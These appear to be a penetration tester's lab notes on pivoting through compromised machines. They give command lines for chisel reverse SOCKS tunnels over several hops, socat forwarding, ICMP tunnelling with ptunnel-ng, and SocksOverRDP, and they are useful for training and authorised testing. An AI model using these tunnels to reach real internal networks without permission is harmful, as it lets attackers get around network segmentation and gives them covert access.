It is useful when we want to access the host & multiple ports that cannot be directly accessible from local machine (when kali is not able to reach target machine). #chisel

```
chisel server -v -p 11601 --socks5 --reverse
```

```
(nohup ./chisel client -v 10.10.16.8:11601 R:socks)& #linux

Start-Process ".\chisel.exe" -ArgumentList "client -v 10.10.16.39:8000 R:socks" -NoNewWindow
```

```
socks5 127.0.0.1 1080
```

# Reverse tunneling (multiple hop)
#### On Kali
```
chisel server -v -p 11601 --reverse
```
##### Port forward
```
(.\socat TCP4-LISTEN:8080,fork,reuseaddr,bind=192.168.1.10 TCP4:192.168.1.100:9090)&
```

#### On compromised host (Jump host) - (Machine IP 172.16.1.100)
```
(nohup ./chisel client -v 10.10.16.3:11601 R:1080:socks)&
```
**Add to `proxychains.conf`:**
```
socks5 127.0.0.1 1080
```

#### On Target 1 - (Machine IP 172.16.1.20)
>Forward `10.10.16.3:11602` port (Jump host) to kali tun port.
```
start-process -filepath ".\chisel.exe" -ArgumentList "client -v 172.16.1.100:11602 R:1081:socks" -NoNewWindow
```
**Add to `proxychains.conf`:**
```
socks5 127.0.0.1 1081
```

#### On Target 2
>Forward `172.16.1.20:11603` port to `Target 1` port or `Target 1` to kali host.
```
start-process -filepath ".\chisel.exe" -ArgumentList "client -v 172.16.1.20:11603 R:1082:socks" -NoNewWindow
```
**Add to `proxychains.conf`:**
```
socks5 127.0.0.1 1082
```

```
[ Kali ]
  IP: <KALI_IP>
  └── chisel server -p 11601 --reverse
  └── chisel server -p 11602 --reverse
  └── chisel server -p 11603 --reverse
  └── SOCKS5 proxies:
        127.0.0.1:1080 → First Pivot
        127.0.0.1:1081 → Second Pivot
        127.0.0.1:1082 → Third Pivot

[ First Pivot ]
  IP: 10.10.109.100 / 172.16.1.100
  └── ./chisel client <KALI_IP>:11601 R:1080:socks
  └── ./chisel client <KALI_IP>:11601 R:9001:127.0.0.1:11602

[ Second Pivot ]
  IP: 172.16.1.120
  └── ./chisel client 172.16.1.100:9001 R:1081:socks
  └── ./chisel client 172.16.1.100:9001 R:9002:127.0.0.1:11603

[ Third Pivot ]
  IP: 172.16.2.109
  └── ./chisel client 172.16.1.120:9002 R:1082:socks
```

# ICMP - Tunneling with socks 

#### Download & build ptunnel-ng 
```
git clone https://github.com/utoni/ptunnel-ng.git && cd ptunnel-ng && sudo ./autogen.sh

```
Transfer ptunnel-ng binary to the compromised host
#### Start ptunnel-ng server (compromised host) 
`-r` IP should be reachable form the attacker box
```
sudo ./ptunnel-ng -r<compromised_host_ip> -R22
```
#### Connect to the ptunnel-ng (attacker host) 
```
sudo ./ptunnel-ng -p<compromised_host_ip> -l2222 -r10.129.202.64 -R22
```
#### Connect SSH connection via ICMP tunnel 
```
ssh -p2222 -lubuntu 127.0.0.1
```
#### Enable dynamic port forwarding over SSH 
```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```
#### Proxychaining through ICMP tunnel 
```
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

>Understand working of this tool properly, analysis the traffic generated by this tool using `wireshark`.

# SocksOverRDP  - RDP and SOCKS tunneling
#### Download appropriate binaries 
- [https://github.com/nccgroup/SocksOverRDP/releases](https://github.com/nccgroup/SocksOverRDP/releases) 
#### Load SocksOverRDP.dll (Host A) 
It will listen on port:1080
```
regsvr32.exe SocksOverRDP-Plugin.dll
```
#### Now transfer the socksoverrdp-server.exe to "Host B" 
```
python3 -m http.server
```
#### On the host B 
```
.\socksoverrdp-server.exe
```
#### Checking connection (compromised host A) 
```
netstat -antb | findstr 1080
```
#### Configure [Proxifier](https://www.proxifier.com/) on initial foothold host 
- Add profile > `Socks5 127.0.0.1 1080`

With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via `127.0.0.1:1080`, which will tunnel it over RDP to `172.16.5.19`, which will then route it to `172.16.6.155` using SocksOverRDP-server.exe. 

#### Connect RDP (initial foothold host)
- Use windows native RDP client
